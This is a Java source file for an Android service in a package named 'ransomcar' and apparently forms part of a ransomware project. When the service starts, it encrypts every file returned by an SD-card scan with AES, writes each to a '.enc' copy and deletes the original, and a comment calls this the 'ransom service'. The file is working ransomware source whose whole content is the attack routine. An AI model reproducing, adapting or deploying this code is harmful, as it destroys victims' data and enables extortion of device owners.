package com.example.ransomcar;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.ArrayList;

import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.spec.SecretKeySpec;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

@SuppressLint("TrulyRandom")
public class EncryptData extends Service {
	int mStartMode;       // indicates how to behave if the service is killed
    IBinder mBinder;      // interface for clients that bind
    boolean mAllowRebind; // indicates whether onRebind should be used

@Override
public IBinder onBind(Intent intent) {
	// TODO Auto-generated method stub
	Log.d("start service", "start");
	return null;
}

@Override
public void onCreate() {             	      
		
	Thread thread = new Thread() {
		@Override
		public void run() {
		    	ArrayList<String> files = ScanSDCard.getListOfFiles(); 
				String myKey = KeyGenerator.key();
				Log.d("Inside of EncryptData", "start encrypting(oncreate)");
				for (String fileName:files){
					Log.d("encryptAll", " File Encrypted: " + fileName);		
					try{
						FileInputStream fis = new FileInputStream(fileName);
						FileOutputStream fos = new FileOutputStream(fileName+".enc");
						SecretKeySpec sks = new SecretKeySpec(myKey.getBytes(), "AES");
						Cipher cipher = Cipher.getInstance("AES");
						cipher.init(Cipher.ENCRYPT_MODE, sks);
						// Wrap the output stream
						CipherOutputStream cos = new CipherOutputStream(fos, cipher);
						// Write bytes
						int b;
						byte[] d = new byte[8];
						while((b = fis.read(d)) != -1) {
							cos.write(d, 0, b);
							}
						cos.flush();
						cos.close();
						fis.close();
						fos.close();
						new File(fileName).delete();}
						
					catch (Exception e) {
							continue;
					}

				}
		 }
	} ;
	//Start ransom service
	thread.start();
	}
}